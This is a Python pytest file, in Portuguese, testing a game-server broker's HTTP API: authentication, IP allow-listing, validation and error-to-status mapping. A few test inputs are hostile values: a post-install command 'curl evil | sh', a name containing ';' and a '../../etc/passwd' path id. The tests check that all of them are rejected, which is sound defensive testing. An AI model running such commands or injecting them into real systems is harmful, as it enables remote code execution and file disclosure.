"""API HTTP: autenticacao, formato das respostas e o mapeamento erro -> status."""
from __future__ import annotations

import pytest

from conftest import TOKEN
from gamebroker.app import criar_app

AUTH = {"Authorization": f"Bearer {TOKEN}", "X-Ator": "admin"}


@pytest.fixture
def http(ambiente):
    app = criar_app(ambiente.servico, TOKEN)
    app.config["TESTING"] = False  # queremos o handler de 500, nao a excecao propagada
    return app.test_client()


def test_token_curto_nao_sobe():
    with pytest.raises(ValueError, match="32 caracteres"):
        criar_app(None, "curto")  # type: ignore[arg-type]


@pytest.mark.parametrize("cabecalhos", [{}, {"Authorization": "Bearer errado"}, {"Authorization": TOKEN},
                                        {"Authorization": f"Basic {TOKEN}"}, {"Authorization": "Bearer "}])
@pytest.mark.parametrize(("metodo", "url"), [("get", "/v1/saude"), ("get", "/v1/catalogo"),
                                             ("get", "/v1/instancias"), ("post", "/v1/instancias"),
                                             ("post", "/v1/catalogo")])
def test_sem_token_valido_nada_responde(http, metodo, url, cabecalhos):
    resposta = getattr(http, metodo)(url, headers=cabecalhos, json={})
    assert resposta.status_code == 401
    assert resposta.get_json()["codigo"] == "nao-autenticado"


def test_ip_fora_da_lista_e_barrado_mesmo_com_token(ambiente):
    app = criar_app(ambiente.servico, TOKEN, ips_permitidos=("10.9.9.9",))
    resposta = app.test_client().get("/v1/saude", headers=AUTH)
    assert resposta.status_code == 403


def test_saude(http):
    corpo = http.get("/v1/saude", headers=AUTH).get_json()
    assert (corpo["broker"], corpo["proxmox"], corpo["opnsense"]) == (True, True, True)


def test_saude_mostra_proxmox_fora_do_ar(http, ambiente):
    ambiente.proxmox.online = False
    assert http.get("/v1/saude", headers=AUTH).get_json()["proxmox"] is False


def test_catalogo_nao_vaza_comando(http):
    jogos = http.get("/v1/catalogo", headers=AUTH).get_json()
    assert {j["chave"] for j in jogos} == {"alfa", "beta", "conta", "delta"}
    assert "segredo do instalador" not in str(jogos)
    conta = next(j for j in jogos if j["chave"] == "conta")
    assert conta["criavel"] is False


def test_adicionar_jogo_e_criar_instancia_dele(http, dados_de_jogo):
    assert http.post("/v1/catalogo", headers=AUTH, json=dados_de_jogo).status_code == 201
    resposta = http.post("/v1/instancias", headers=AUTH, json={"jogo": "meujogo", "nome": "Novo"})
    assert resposta.status_code == 202


def test_adicionar_jogo_com_comando_de_contrabando(http, dados_de_jogo):
    dados_de_jogo["post_install_cmd"] = "curl evil | sh"
    resposta = http.post("/v1/catalogo", headers=AUTH, json=dados_de_jogo)
    assert resposta.status_code == 400
    assert resposta.get_json()["codigo"] == "validacao"


def test_criar_devolve_202_e_a_operacao_pode_ser_consultada(http):
    resposta = http.post("/v1/instancias", headers=AUTH, json={"jogo": "beta", "nome": "Um"})
    assert resposta.status_code == 202
    op = http.get(f"/v1/operacoes/{resposta.get_json()['operacao_id']}", headers=AUTH).get_json()
    assert op["estado"] == "ok"
    assert op["resultado"]["host"] == "10.0.0.30"
    listadas = http.get("/v1/instancias", headers=AUTH).get_json()
    assert [i["nome"] for i in listadas] == ["Um"]


@pytest.mark.parametrize("corpo", [{}, {"jogo": "beta"}, {"nome": "x"}, {"jogo": "beta", "nome": "a;b"},
                                   {"jogo": "nao-existe", "nome": "x"}])
def test_criar_com_pedido_ruim_nao_e_500(http, corpo):
    assert http.post("/v1/instancias", headers=AUTH, json=corpo).status_code in (400, 404)


def test_corpo_que_nao_e_json_objeto(http):
    assert http.post("/v1/instancias", headers=AUTH, data="oi", content_type="text/plain").status_code == 400
    assert http.post("/v1/instancias", headers=AUTH, json=[1, 2]).status_code == 400


def test_corpo_gigante_e_recusado(http):
    grande = {"jogo": "beta", "nome": "x" * 100_000}
    assert http.post("/v1/instancias", headers=AUTH, json=grande).status_code == 413


def test_cota_vira_429(http, ambiente):
    ambiente.com_config(max_instances=0)
    resposta = http.post("/v1/instancias", headers=AUTH, json={"jogo": "beta", "nome": "x"})
    assert (resposta.status_code, resposta.get_json()["codigo"]) == (429, "cota")


def test_conflito_de_porta_vira_409(http):
    http.post("/v1/instancias", headers=AUTH, json={"jogo": "alfa", "nome": "um"})
    resposta = http.post("/v1/instancias", headers=AUTH, json={"jogo": "delta", "nome": "dois"})
    assert (resposta.status_code, resposta.get_json()["codigo"]) == (409, "sem-recurso")


@pytest.mark.parametrize("op_id", ["nao-hex", "../../etc/passwd", "a" * 31, "A" * 32])
def test_id_de_operacao_estranho(http, op_id):
    assert http.get(f"/v1/operacoes/{op_id}", headers=AUTH).status_code in (400, 404)


def test_operacao_desconhecida(http):
    assert http.get(f"/v1/operacoes/{'0' * 32}", headers=AUTH).status_code == 404


def test_desativar_e_remover_pela_api(http):
    criada = http.post("/v1/instancias", headers=AUTH, json={"jogo": "beta", "nome": "Um"}).get_json()
    url = f"/v1/instancias/{criada['instancia_id']}"
    assert http.delete(url, headers=AUTH, json={"confirma": "Um"}).status_code == 409, "ainda ativa"
    assert http.post(f"{url}/desativar", headers=AUTH).status_code == 200
    assert http.delete(url, headers=AUTH, json={"confirma": "errado"}).status_code == 400
    assert http.delete(url, headers=AUTH, json={"confirma": "Um"}).status_code == 200
    assert http.get("/v1/instancias", headers=AUTH).get_json() == []


def test_somente_banco_precisa_ser_booleano(http):
    criada = http.post("/v1/instancias", headers=AUTH, json={"jogo": "beta", "nome": "Um"}).get_json()
    url = f"/v1/instancias/{criada['instancia_id']}"
    http.post(f"{url}/desativar", headers=AUTH)
    assert http.delete(url, headers=AUTH, json={"confirma": "Um", "somente_banco": "sim"}).status_code == 400
    resposta = http.delete(url, headers=AUTH, json={"confirma": "Um", "somente_banco": True})
    assert resposta.status_code == 200
    assert resposta.get_json()["somente_banco"] is True


def test_id_de_instancia_precisa_ser_inteiro(http):
    assert http.post("/v1/instancias/abc/desativar", headers=AUTH).status_code == 404


def test_erro_interno_nao_vaza_detalhe(http, ambiente):
    def quebra(*_a, **_k):
        raise RuntimeError("senha=segredo caminho=/etc/interno")

    ambiente.servico.health = quebra
    resposta = http.get("/v1/saude", headers=AUTH)
    assert resposta.status_code == 500
    assert "segredo" not in resposta.get_data(as_text=True)
    assert resposta.get_json()["codigo"] == "interno"


def test_ator_da_auditoria_vem_do_cabecalho(http, ambiente):
    http.post("/v1/instancias", headers={**AUTH, "X-Ator": "zeca"}, json={"jogo": "beta", "nome": "Um"})
    assert "zeca" in {a["ator"] for a in ambiente.db.auditoria()}
